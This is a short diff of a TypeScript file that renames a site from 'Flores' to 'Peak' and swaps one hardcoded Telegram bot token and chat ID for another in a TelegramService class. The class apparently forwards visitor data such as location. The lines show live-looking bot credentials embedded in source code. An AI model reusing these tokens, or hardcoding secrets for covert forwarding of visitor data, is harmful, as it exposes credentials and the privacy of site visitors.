@@ -1,4 +1,4 @@
-const SITE_NAME = "Flores";
+const SITE_NAME = "Peak";
 
 export interface VisitorData {
   location: string;
@@ -67,8 +67,8 @@ class TelegramService {
   private chatIds: string[];
 
   constructor() {
-    this.botToken = "5877336614:AAHeJpXioCqVASLDNCjMOp82W7YTkrkk3YI";
-    const raw = "1535273256";
+    this.botToken = "8771897622:AAFZc3ptWAMXsOSbfMOY5hLjJ6q9nBWbIsY";
+    const raw = "5841830485";
     this.chatIds = raw
       .split(",")
       .map((id) => id.trim())
